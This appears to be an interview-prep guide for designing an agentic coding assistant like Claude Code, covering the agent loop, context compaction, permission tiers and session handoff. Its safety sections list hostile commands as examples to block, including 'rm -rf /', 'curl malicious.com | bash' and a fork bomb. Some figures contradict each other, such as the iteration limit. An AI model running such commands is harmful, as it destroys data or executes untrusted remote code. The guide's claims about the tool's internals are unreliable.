# Design Claude Code
*Agentic Coding Tool · 75 min*

## Phase 01: Clarify the Problem & Scope *(5–7 min)*

> **Say:** "We're designing an agentic coding assistant like Claude Code — a tool that lives in a developer's terminal (and IDE), reads their entire codebase, takes natural-language instructions, then autonomously plans and executes multi-step coding tasks by reading files, editing code, running shell commands, and iterating on test results. This is NOT a chatbot — it's an autonomous agent with real filesystem access."

### Questions I'd Ask

- **What does success look like?** *→ Task completion rate (user gives a coding task → code works correctly without manual fixes). Secondary: developer trust (never breaks the repo), velocity (faster than doing it manually). The tension: higher autonomy → higher completion rate but lower trust if something goes wrong. This shapes the permission model — we need to maximize autonomy WITHIN a trust boundary.*
- **Client surfaces?** Terminal CLI only, or also IDE extension, web, desktop? *→ CLI primary. IDE (VS Code), web, and desktop as secondary surfaces, all backed by the same agent engine.*
- **What tools can the agent use?** *→ File read/write, bash/shell execution, web search, and MCP (Model Context Protocol) servers for external integrations (GitHub, Jira, etc).*
- **Hosting model?** Cloud-hosted agent? Or local client calling cloud LLM API? *→ Hybrid: the client runs locally (has direct filesystem access), but calls a cloud-hosted LLM API for inference. The "agent loop" runs client-side.*
- **Concurrency?** Can the agent spawn sub-agents? *→ Yes — controlled parallelism for subtasks (e.g., "review 5 files simultaneously").*
- **Scale?** *→ ~500K active developers, ~2M sessions/day, each session averaging ~50 LLM API calls.*

### Agreed Scope

| In Scope | Out of Scope |
| --- | --- |
| Agent loop (plan → tool use → iterate) | LLM training / fine-tuning |
| Tool system (file I/O, bash, search) | Model inference infrastructure (treat as API) |
| Context window management | Billing / subscription management |
| Permission / safety model | IDE rendering engine |
| Session persistence & multi-surface | CI/CD pipeline internals |
| MCP server integration | Code completion / autocomplete (different product) |
| Sub-agent parallelism | Marketplace for plugins |
| CLAUDE.md configuration system |  |

### Core Use Cases

- **UC1:** Developer says "refactor the auth module from callbacks to async/await" → agent reads files, plans changes, edits multiple files, runs tests, iterates until tests pass.
- **UC2:** Developer says "fix the bug in issue #342" → agent reads the GitHub issue (via MCP), searches codebase for relevant code, makes the fix, writes a test, commits.
- **UC3:** Developer gives real-time steering mid-task — "actually, don't change the database layer" → agent adjusts plan without restarting.
- **UC4:** Developer starts a task in terminal, moves to VS Code to see diffs, then continues on desktop app.

### Non-Functional Requirements

- **Streaming latency** — first token must appear within 1-2 seconds. User watches the agent think in real-time.
- **Tool execution must be fast** — file reads and bash commands run locally (no network round-trip for filesystem).
- **Safety is non-negotiable** — the agent can execute arbitrary bash commands. Must never run destructive commands without explicit user approval.
- **Context fidelity** — the agent must maintain coherent understanding of the codebase across a long session (potentially hundreds of tool calls), even as the context window fills.
- **Resumability** — sessions must survive terminal crashes and be transferable between surfaces.

> **Tip:** This system is fundamentally different from Uber/Facebook/Amazon. Those were request-response at scale. This is a LONG-RUNNING STATEFUL AGENT with real-world side effects (file writes, shell commands). The defining tension: giving the agent enough autonomy to be useful, while keeping the human in control of dangerous operations.

## Phase 02: Back-of-the-Envelope Estimation *(3–5 min)*

| Metric | Value | Detail |
| --- | --- | --- |
| Active Developers | ~500K | Concurrent sessions at peak: ~100K |
| Sessions / Day | ~2M | Avg session: ~15 min, ~50 LLM calls |
| LLM API Calls / Day | ~100M | 2M sessions × 50 calls. ~1.2K calls/sec avg, ~5K/sec peak. |
| Tokens / Day | ~50B | Avg ~500K tokens/session (large context windows). Dominated by input tokens (codebase context). |
| Tool Executions / Day | ~80M | ~40 tool calls/session. File reads dominate (~60%), then bash (~25%), then edits (~15%). |
| Session State | ~5 MB avg | Message history + tool results. 100K concurrent × 5MB = ~500GB active state. |

> **Decision:** **Key insight #1:** The bottleneck is NOT traditional web-scale throughput. It's LLM inference cost and latency. Each API call can take 5-30 seconds and costs $0.01-0.50 in tokens. The system design is dominated by context management (minimizing tokens) and tool execution orchestration (minimizing round-trips).

> **Decision:** **Key insight #2:** The agent loop runs CLIENT-SIDE (on the developer's machine). This means filesystem operations are local (fast) and we don't need to host compute for tool execution. The cloud serves only the LLM API, session storage, and coordination.

> **Decision:** **Key insight #3:** 500GB of active session state needs persistence for crash recovery and multi-surface handoff. But it's ephemeral — sessions expire after hours/days, not stored forever.

## Phase 03: High-Level Design *(8–12 min)*

> **Say:** "The key architectural insight is that this is a SPLIT ARCHITECTURE — the agent loop and tool execution run locally on the developer's machine, while inference and session persistence live in the cloud. Let me draw both sides."

### Key Architecture Decisions

> **Say:** "Here's WHY I chose each technology — mapping requirements to tradeoffs. Every choice has a rejected alternative and a consequence."

| Requirement | Decision | Why (and what was rejected) | Consistency |
| --- | --- | --- | --- |
| Streaming first-token latency <2 seconds | Direct API streaming (no queue/batch) | User watches agent think in real-time. Queueing would add seconds of latency. Streaming HTTP/SSE from Claude API. | — |
| Tool execution: bash, file edit, search | Local execution on developer's machine (not cloud sandbox) | Zero network latency for filesystem operations. Full access to project files, git, local tools. Cloud sandbox would add 100ms+ per tool call. | — |
| Context window is a hard 200K token limit | Compaction strategy (summarize old turns) | When approaching limit, compress tool outputs into summaries. Preserves key decisions and state. Alternative: truncate (loses critical context). | — |
| Safety: prevent dangerous commands | Multi-layered: classification + permission + sandbox | Risk-tier classification of bash commands. Dangerous operations require human approval. No single layer is foolproof — defense in depth. | — |
| No persistent state between sessions | Filesystem IS the state (git repo) | The project's files and git history are the durable state. No database needed. CLAUDE.md for project preferences persists across sessions. | — |

### Major Components

```mermaid
graph TD
    subgraph CLIENTS["CLIENTS"]
        A["Developer<br/>terminal · IDE"]
    end
    subgraph LOCAL_AGENT_developer_machine["LOCAL AGENT (developer machine)"]
        B["⌨ CLI Interface<br/>REPL · slash commands"]
        C["Agent Loop<br/>tool → LLM → tool cycle"]
        D["Tool Executor<br/>bash · edit · search"]
        E["Context Manager<br/>compaction · 200K window"]
    end
    subgraph EXTERNAL["EXTERNAL"]
        F["Claude API<br/>Anthropic · streaming"]
        G["Local Filesystem<br/>git repo · project files"]
    end
    A --> B
    B --> C
    C -->|prompt| F
    C --> D
    D --> G
    E --> C
```



#### Client Agent Runtime [LOCAL]
- Master agent loop (the "brain")
- Tool executor (file I/O, bash, search)
- CLAUDE.md loader & config parser
- Permission system (confirm/deny prompts)
- Streaming UI renderer

#### LLM Inference API [CLOUD]
- Messages API with streaming
- Tool definitions & tool_use responses
- Model routing (Opus/Sonnet based on task)
- Rate limiting & quota management

#### Tool System [LOCAL]
- FileRead, FileWrite, FileEdit (str_replace)
- Bash (persistent shell sessions)
- Search (grep, ripgrep, ast-grep)
- TodoWrite (structured task tracking)
- MCP client → external MCP servers

#### Session Service [CLOUD]
- Persist conversation history
- Enable multi-surface handoff
- Crash recovery (resume from last state)
- Session TTL & cleanup

#### Permission Engine [LOCAL]
- Risk classification per tool invocation
- Auto-approve safe ops (file read)
- Prompt for dangerous ops (rm, git push)
- Block disallowed operations

#### MCP Gateway [LOCAL+REMOTE]
- MCP client connects to user-configured servers
- GitHub, Jira, Slack, Google Drive, etc.
- Tools dynamically registered from MCP

#### Sub-Agent System [LOCAL]
- Spawn parallel agents for subtasks
- Each sub-agent: own context, own tool access
- Lead agent coordinates & merges results

#### CLAUDE.md System [LOCAL]
- Project-root config file
- Coding standards, architecture notes
- Injected into system prompt every session
- Hierarchical: project → directory → user global

### Flow 1: Developer Gives an Instruction

```mermaid
graph TD
    A["Developer<br/>: "refactor auth module to async/await""]
    B["Client Agent Runtime"]
    C["LLM API"]
    D["Client"]
    E["Tool Executor<br/>local"]
    F["LLM API"]
    G["Client"]
    H["Agent Loop Terminates<br/>→ control returns to developer"]
    A --> B
    B --> C
    C --> D
    D --> E
    E --> F
    F --> G
    G --> H
```



### Flow 2: Real-Time Steering


> **Say:** "The most architecturally interesting piece is the agent loop itself — the single-threaded master loop that decides when to call tools, when to plan, and when to stop. That's what I'd like to deep-dive first. Second, context window management — how do we keep the agent coherent over 100+ tool calls without exceeding the context limit."

## Phase 04: Deep Dives *(25–30 min)*

### Deep Dive 1: Agent Loop & Tool System (~10 min)

> **Goal:** **The core challenge:** Design a loop that autonomously plans and executes multi-step coding tasks, uses tools effectively, recovers from errors, and terminates when done — while remaining debuggable, transparent, and steerable by the human.

**The Master Loop (Single-Threaded)**

```sql
── Pseudocode: Agent Master Loop ──
function agentLoop(userMessage, conversationHistory):
  history = [...conversationHistory, {role: "user", content: userMessage}]

  while true:
    // 1. Check steering queue for mid-task instructions
    if steeringQueue.hasMessages():
      history.append({role: "user", content: steeringQueue.drain()})

    // 2. Inject TODO list reminder (keeps agent on track)
    history.append({role: "system", content: currentTodoList()})

    // 3. Call LLM API with full history + tool definitions
    response = streamingLLMCall(history, tools=ALL_TOOLS)

    // 4. Process response
    if response.hasToolUse():
      for each toolCall in response.toolCalls:
        // 4a. Check permissions
        if permissionEngine.requiresApproval(toolCall):
          approved = promptUser(toolCall)
          if !approved: history.append(toolResult("User denied this action"))
          else: result = executeTool(toolCall)
        else:
          result = executeTool(toolCall)
        history.append(toolResult(result))
      // Loop continues — send tool results back to LLM

    else:
      // 4b. Plain text response — agent is done
      display(response.text)
      break // Exit loop, return control to user

  persistSession(history)
```

> **Decision:** **Why single-threaded, not multi-agent swarm?** A single-threaded loop with one flat message history is dramatically easier to debug, reason about, and steer. Multi-agent swarms introduce race conditions, conflicting edits, and unpredictable behavior. The single loop gives us transparency: every decision the agent makes is visible in the linear history. Tradeoff: it's sequential (can't parallelize within a single task step), but this is addressed by sub-agent dispatch for explicitly parallel subtasks.

**Tool System Design**

| Tool | Runs On | Risk Level | Description |
| --- | --- | --- | --- |
| FileRead | Local | 🟢 Safe | Read file contents. Auto-approved. Most frequent tool (~60% of calls). |
| ListDir | Local | 🟢 Safe | List directory structure. Auto-approved. |
| Search (grep/ripgrep) | Local | 🟢 Safe | Pattern search across codebase. Auto-approved. |
| FileWrite | Local | 🟡 Medium | Create new file. Auto-approved (not overwriting). |
| FileEdit (str_replace) | Local | 🟡 Medium | Edit existing file with targeted replacement. Auto-approved by default. |
| Bash | Local | 🟡-🔴 Variable | Execute shell command. Risk classified per command. `npm test` = safe, `rm -rf` = blocked. |
| TodoWrite | Local | 🟢 Safe | Structured task list. Injected as reminder after each tool call. |
| MCP Tool | Remote | 🟡 Medium | Dynamic tools from MCP servers. User configures which servers. |

> **Decision:** **Why str_replace for edits instead of full-file rewrites?** Targeted edits (find unique string → replace) are more reliable than regenerating an entire file. A full-file rewrite risks corrupting parts the model wasn't focused on, especially in large files. str_replace ensures only the intended change is made. Tradeoff: requires the replaced string to be unique in the file, which occasionally fails — the tool returns an error and the model retries with more context.

**Planning: TodoWrite**

- The model creates a structured JSON task list with IDs, descriptions, status (pending/in_progress/done), and priority.
- After EVERY tool execution, the current TODO list is injected as a system message ("Reminder: here's your current plan").
- This prevents the model from "forgetting" the plan mid-session as the context window fills with tool results.
- Rendered as an interactive checklist in the terminal UI — user can see agent's progress.

> **Tip:** **The termination signal:** The loop exits when the LLM returns a response with NO tool_use blocks — just text. This is the model's way of saying "I'm done, here's my summary." The human never has to manually stop the agent (though they can interrupt at any time).

### Deep Dive 2: Context Window Management (~8 min)

> **Goal:** **The core challenge:** A session may involve 100+ tool calls. Each tool result (e.g., a 500-line file) consumes tokens. The context window (128K-200K tokens) fills up fast. How do we keep the agent coherent without losing critical information?

**Context Budget Strategy**

```sql
── Context Window Layout (200K token budget) ──
System Prompt          ~5K tokens   // Tool definitions, CLAUDE.md, permissions
Conversation History    ~150K tokens // Messages + tool results (managed)
TODO Reminder           ~1K tokens   // Injected after each tool call
Steering Messages       ~2K tokens   // User mid-task instructions
Reserved for Output     ~8K tokens   // Model's response + tool calls
Buffer                  ~34K tokens  // Safety margin
```

- **Truncation strategy:** When history exceeds ~150K tokens, compress OLDEST tool results. Keep user messages and model reasoning intact. Truncate large file contents to first/last N lines with "[truncated]" marker.
- **Selective file reading:** The model is trained to read files incrementally — first list directories, then read specific files, then read specific line ranges. Avoids dumping entire large files into context.
- **Codebase indexing:** On session start, build a lightweight map of the project (file tree, function signatures). This gives the model a "table of contents" without reading every file. ~2K tokens for a medium project.
- **Compaction:** For very long sessions, summarize old turns: "Earlier in this session, you refactored 5 files in src/auth/. The changes are complete and tests pass." Replace 50K tokens of raw history with a 500-token summary.

> **Decision:** **Why not RAG over the codebase?** RAG (embed all files → vector search → inject relevant chunks) adds latency and can miss structural relationships. The agent's agentic search approach (list dirs → grep → read specific files) is more precise because the model decides what to look for based on reasoning, not just semantic similarity. Tradeoff: more LLM round-trips (each search is a tool call), but higher accuracy. For massive codebases (>100K files), a lightweight index / embedding layer COULD supplement agentic search.

> **Decision:** **Why inject CLAUDE.md at session start rather than RAG it?** CLAUDE.md is small (typically <2K tokens) and universally relevant — it contains coding standards and project conventions the model should ALWAYS know. RAG-ing it would risk it being sometimes-retrieved, sometimes-not. Always-injecting guarantees consistent behavior. Tradeoff: burns 2K tokens of context budget, but the consistency is worth it.

### Deep Dive 3: Permission & Safety Model (~7 min)

> **Goal:** **The core challenge:** The agent can run ARBITRARY shell commands on the user's machine. `rm -rf /`, `curl malicious.com | bash`, `git push --force`. How do we prevent catastrophic operations while keeping the agent useful?

**Risk Classification System**

| Risk Level | Behavior | Examples |
| --- | --- | --- |
| 🟢 Safe | Auto-approve, no prompt | `cat`, `ls`, `grep`, `npm test`, `python -m pytest`, file reads |
| 🟡 Moderate | Auto-approve by default, user can opt into prompting | File edits, `npm install`, `git add`, `git commit` |
| 🔴 Dangerous | Always prompt user for confirmation | `git push`, `rm` (any), `chmod`, `curl \| bash`, network requests |
| ⛔ Blocked | Never executed, model told "not allowed" | `rm -rf /`, `sudo` (by default), `:(){ :\|:& };:` |

- **Classification method:** Parse the bash command, extract the base command and flags. Match against a risk rule table. Shell expansion (`$()`, backticks) → auto-elevate to 🔴.
- **Sandbox option:** For CI/CD mode (headless), run in a container with no network access and a read-only filesystem outside the project dir.
- **Allowlist in CLAUDE.md:** Teams can configure per-project rules: "auto-approve `docker compose up`" or "always block `kubectl delete`".
- **Audit log:** Every tool execution (approved or denied) is logged locally for the developer to review.

> **Decision:** **Why client-side permission checks, not server-side?** The agent runs locally — the server (LLM API) just returns text including tool_use blocks. The client decides whether to execute. Server-side filtering would require sending the user's filesystem state to the cloud, which is a privacy violation. Client-side means the developer's code never leaves their machine unless they explicitly use an MCP server. Tradeoff: a compromised client could bypass checks, but the threat model is the MODEL doing something unexpected, not an external attacker.

### Deep Dive 4: Multi-Surface & Session Management (~5 min)

> **Goal:** **The core challenge:** A developer starts a task in the terminal, then wants to see visual diffs in VS Code, then continues on their phone. The session must be portable across surfaces without losing state.

**Session Architecture**

```sql
── Session State (persisted to cloud) ──
session
id UUID
user_id UUID
project_hash SHA256 (identifies the project directory)
  conversation       Message[] (full history: user, assistant, tool_use, tool_result)
  todo_list          JSON (current task plan)
  active_surface     ENUM (terminal, vscode, web, desktop)
  status             ENUM (active, paused, completed)
  created_at         TIMESTAMP
  last_active_at     TIMESTAMP
  ttl                TIMESTAMP (auto-expire after 24h of inactivity)
── Storage: DynamoDB or Redis with persistence ──
── Avg session: ~5MB. 100K concurrent = ~500GB. Fits in a Redis cluster.
```

- **Handoff protocol (/teleport):** User types `/teleport` in terminal → session marked as "paused" with current state → VS Code extension polls for available sessions → user picks session → VS Code resumes with full context.
- **Conflict prevention:** Only one surface can be "active" for a session at a time. Second surface trying to connect gets "session in use on [terminal]" — user must release first.
- **Crash recovery:** Session state is persisted after EVERY tool execution. If terminal crashes mid-session, user restarts and gets "Resume previous session?" with the TODO list showing progress.
- **Sync model:** Conversation history synced to cloud after each turn. Tool results (file contents) NOT synced — they're re-read locally if needed. This keeps sync payloads small (~10KB per turn vs. ~5MB for full file contents).

> **Decision:** **Why not sync file contents to cloud?** Files change locally between surfaces. If the developer edits a file in their IDE between terminal and VS Code sessions, the cloud-stored file content is stale. Better to re-read from the local filesystem when the session resumes. Only the conversation messages (which reference files by path) are synced. Tradeoff: resuming on a different machine requires the same project checkout.

## Phase 05: Cross-Cutting Concerns *(10–12 min)*

### Storage Architecture Summary

> **Goal:** **What goes where and why.** Each data store is chosen for its access pattern — not by default. The question isn't "which database?" but "what are the read/write patterns, consistency requirements, and scale characteristics?"

| Data | Store | Why This Store |
| --- | --- | --- |
| Conversation context | In-memory (agent runtime) | Current conversation turns + tool results. Fits within 200K token context window. Compacted when approaching limit. |
| File system state | Local disk | The project's files. Read/written by tool executor. Git provides version history. No external database needed. |
| Session metadata | DynamoDB / local | Session ID, user preferences, permission grants, active projects. Lightweight, key-value access pattern. |
| Conversation history | S3 / local JSON | Past conversations for reference. Not loaded into context unless explicitly requested. Markdown export. |
| Tool execution logs | Local disk | Bash command history, file edit history. Used for undo/rollback. Ephemeral per session. |

### Failure Scenarios

| Scenario | Mitigation |
| --- | --- |
| LLM API is slow / timeout | Streaming shows partial output immediately. On timeout, retry with exponential backoff. Show "thinking..." indicator. If persistent, offer fallback to faster/smaller model (Sonnet instead of Opus). |
| Agent enters infinite loop | Max iteration limit (configurable, default ~200 tool calls per turn). Detect repetitive patterns (same tool call 3x in a row → inject "You seem stuck" message). User can always Ctrl+C to interrupt. |
| Tool execution fails (bash error) | Error output returned to model as tool_result. The model is trained to read errors and adjust. Most coding iterations are exactly this: run tests → see failure → fix → rerun. |
| Context window exhausted | Trigger compaction: summarize oldest turns, truncate large tool results. Inform user: "Compacting conversation to fit context." In extreme cases, start a new context with a summary carryover. |
| Terminal crash mid-edit | File writes are atomic (write to temp file → rename). Session state was persisted after last tool call. On restart, files reflect last successful edit, and session resumes from last checkpoint. |
| MCP server unreachable | Tool call returns error. Model informed "GitHub MCP server is unavailable." Agent continues with local tools. Degrades gracefully — can still read code, just can't fetch issues. |
| Model hallucinates a file path | FileRead returns "file not found" as tool_result. Model sees the error and typically self-corrects by listing the directory first. This is the normal agentic search pattern. |

### Scalability Considerations

| Dimension | Bottleneck | Mitigation |
| --- | --- | --- |
| LLM inference | 100M API calls/day at 500K tokens avg. Massive GPU demand. | Model cascade: use smaller model for simple tasks (file listing, grep), larger model for reasoning. Prompt caching for repeated system prompts. |
| Large codebases | >100K files — agent can't browse efficiently | Build project index on session start. Supplement agentic search with lightweight embedding index. Cache file tree across sessions. |
| Long sessions | 200K context fills after ~100 tool calls | Progressive compaction. Sub-agent dispatch (each sub-agent has its own fresh context). Session forking for parallel explorations. |
| Session storage | 500GB active state, 2M new sessions/day | Redis cluster for active sessions. Archive completed sessions to S3. TTL-based eviction (24h inactive). |

### Security & Privacy

- **Code never leaves the machine (by default):** Tool execution is local. Only conversation messages (user prompts + model responses) go to the cloud LLM API. File contents are sent AS PART OF the API call (as tool results) — but only the files the model explicitly reads.
- **MCP is user-opt-in:** Each MCP server connection is explicitly configured by the developer. No automatic external connections.
- **Bash injection prevention:** Tool system filters shell expansion constructs (backticks, `$()`) to prevent prompt-injection attacks where malicious file contents trick the model into running harmful commands.
- **Audit trail:** Full log of every tool call, approval/denial, and model reasoning. Stored locally.

### Observability

- **Per-session metrics:** Token usage, tool call count, error rate, session duration, task completion rate.
- **Latency tracking:** Time-to-first-token per LLM call. Tool execution latency. End-to-end task completion time.
- **Quality signals:** Does the agent's code compile? Do tests pass after changes? How many iterations to success?
- **Cost per session:** Token cost breakdown (input vs. output). Identify sessions that burn excessive tokens (stuck in loops).

## Phase 06: Wrap-Up & Evolution *(3–5 min)*

> **Say:** "To summarize: the architecture is a split design — a local client-side agent runtime that owns the master loop, tool execution, and permission system, backed by a cloud LLM inference API and session persistence layer. The master loop is deliberately single-threaded with one flat message history for debuggability and steerability, with controlled parallelism via sub-agent dispatch for explicitly parallel subtasks. Context window management uses progressive compaction and agentic search (model decides what to read) rather than RAG, trading LLM round-trips for accuracy. The safety model classifies every tool invocation by risk level with client-side enforcement, ensuring code never leaves the developer's machine unless explicitly sent. Session persistence enables crash recovery and multi-surface handoff."

### What I'd Build Next

| Extension | Why It Matters | Architecture Impact |
| --- | --- | --- |
| Background Agents | Long-running tasks (CI monitoring, refactoring overnight) | Agent loop must run server-side in a sandbox (not on dev's machine). Requires cloud-hosted tool execution with filesystem snapshots. |
| Multi-Repo Awareness | Monorepo and cross-repo refactoring | Session spans multiple project roots. Index system must understand repo boundaries and dependency graphs. |
| Fine-Grained Code Memory | Agent remembers project decisions across sessions | Persistent vector store of project-specific learnings. Injected into context via RAG, complementing CLAUDE.md. |
| Collaborative Sessions | Two developers working with the same agent | Real-time sync of conversation state. Conflict resolution when both steer simultaneously. |
| Plugin Ecosystem | Community-built tools and workflows | Plugin registry, sandboxed plugin execution, permission inheritance. MCP is already the protocol — need discovery + trust. |

> **Tip:** **Closing framing:** This design is defined by ONE fundamental difference from traditional web systems: it's a LONG-RUNNING STATEFUL AGENT with real-world side effects. Every design decision flows from that: the single-threaded loop for controllability, client-side execution for privacy, permission classification for safety, session persistence for resilience, and context compaction for coherence. The architecture is intentionally simple — complexity is the enemy of debuggability, and debuggability is everything when your agent has `sudo`.

## Phase 07: Interview Q&A *(Practice)*

> **Say:** "Here are the hardest questions an interviewer would ask about this design, and how to answer them. Each answer demonstrates deep understanding of the tradeoffs, not just surface knowledge."

**Q:** How does context window management work when a conversation exceeds 200K tokens?

**A:** The context window is a hard constraint — once you're near the limit, you can't just add more tokens. Claude Code uses a compaction strategy: (1) the Context Manager monitors token usage continuously, (2) when usage exceeds ~80% (160K tokens), it triggers compaction, (3) compaction summarizes older conversation turns into a condensed form — detailed tool outputs become summaries, intermediate reasoning becomes conclusions, (4) the compacted context is verified to contain all essential state: what files were modified, what decisions were made, what the current goal is. The key insight is that most of the context is tool results (file contents, bash outputs), not conversation. A `cat` of a 5000-line file takes 5000 lines of context but can be summarized as "file X contains a React component with 15 functions" in 20 tokens. The tradeoff: compaction loses detail. If the user later asks "what was on line 347?", Claude Code needs to re-read the file rather than recall from context.

**Q:** What prevents Claude Code from executing dangerous commands like rm -rf /?

**A:** Multi-layered safety: (1) permission model — dangerous operations (bash commands, file writes outside project directory) require explicit user approval. The default is "ask before executing." (2) Command classification — the agent classifies each proposed bash command into risk tiers: safe (ls, cat, grep), moderate (npm install, git commit), dangerous (rm -rf, sudo, curl | sh). Dangerous commands always require approval, even in "auto-approve" mode. (3) Sandboxing — in cloud environments, the tool executor runs in a container with limited filesystem access and no network egress to sensitive endpoints. (4) The LLM itself is trained to be cautious — Claude will propose `rm -rf node_modules/` but is unlikely to propose `rm -rf /` because its training emphasizes safe coding practices. The honest limitation: no sandbox is perfect. A sufficiently creative prompt injection could potentially bypass classification heuristics, which is why the human-in-the-loop approval remains the ultimate safety net.

**Q:** How does the agent loop decide when to stop?

**A:** The agent loop has multiple termination conditions: (1) Task complete — the LLM's response doesn't include a tool call, just a natural language summary. This is the normal exit. (2) User interrupt — the developer presses Ctrl+C or sends a steering message. (3) Max iterations — a configurable limit (default: 50 tool calls) prevents infinite loops. (4) Error threshold — if 3 consecutive tool calls fail, the agent pauses and asks the user for guidance. (5) Budget limit — optional token/cost cap. The most interesting case is detecting "completion" — the LLM must judge when the task is actually done. For concrete tasks ("add a login page"), it runs the code, sees it works, and stops. For vague tasks ("make the code better"), it can loop indefinitely — which is why the max iteration limit exists. The steering queue allows the developer to redirect mid-task: "stop refactoring, focus on the tests" is injected into the context and changes the agent's goal without restarting.
